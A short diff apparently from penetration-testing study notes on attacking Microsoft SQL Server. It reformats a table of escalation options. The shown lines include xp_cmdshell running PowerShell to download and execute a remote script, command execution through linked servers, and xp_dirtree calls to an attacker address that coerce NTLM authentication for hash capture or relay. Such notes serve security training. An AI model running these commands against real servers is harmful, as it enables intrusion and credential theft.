@@ -165,11 +165,11 @@ EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''
 
 **Decision point:**
 
-|Situation|Technique|
-|---|---|
-|`xp_cmdshell` disabled and re-enable fails (no sysadmin)|Try `sp_OACreate` COM object RCE, or trustworthy DB + `EXECUTE AS` impersonation chain|
-|Linked servers present|`SELECT * FROM sys.servers;` → `EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER];` (linked-server privesc, common exam vector)|
-|Service account is domain account|Coerce/relay: MSSQL service often runs as a domain user usable for NTLM relay via `xp_dirtree \\<attacker_ip>\share` to capture/relay the hash|
+| Situation                                                | Technique                                                                                                                                      |
+| -------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
+| `xp_cmdshell` disabled and re-enable fails (no sysadmin) | Try `sp_OACreate` COM object RCE, or trustworthy DB + `EXECUTE AS` impersonation chain                                                         |
+| Linked servers present                                   | `SELECT * FROM sys.servers;` → `EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER];` (linked-server privesc, common exam vector)             |
+| Service account is domain account                        | Coerce/relay: MSSQL service often runs as a domain user usable for NTLM relay via `xp_dirtree \\<attacker_ip>\share` to capture/relay the hash |
 
 ```sql
 EXEC master..xp_dirtree '\\<attacker_ip>\share';   -- forces auth attempt, capture with responder/ntlmrelayx
